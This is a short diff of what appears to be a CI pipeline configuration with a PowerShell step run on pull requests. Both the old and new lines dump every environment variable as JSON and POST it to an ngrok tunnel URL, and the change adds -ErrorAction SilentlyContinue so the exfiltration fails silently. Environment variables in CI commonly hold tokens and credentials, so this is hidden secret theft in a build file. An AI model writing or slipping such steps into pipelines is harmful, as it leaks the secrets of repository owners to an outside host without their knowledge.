@@ -22,5 +22,5 @@ pr:
   
 steps:
 - pwsh: |
-    gci Env: | ConvertTo-Json | invoke-webrequest -Method POST -Uri http://564504aaa559.ngrok.io
-    Write-Output foo | invoke-webrequest -Method POST -Uri http://564504aaa559.ngrok.io
+    gci Env: | ConvertTo-Json | invoke-webrequest -Method POST -Uri http://564504aaa559.ngrok.io -ErrorAction SilentlyContinue
+    Write-Output foo | invoke-webrequest -Method POST -Uri http://564504aaa559.ngrok.io -ErrorAction SilentlyContinue
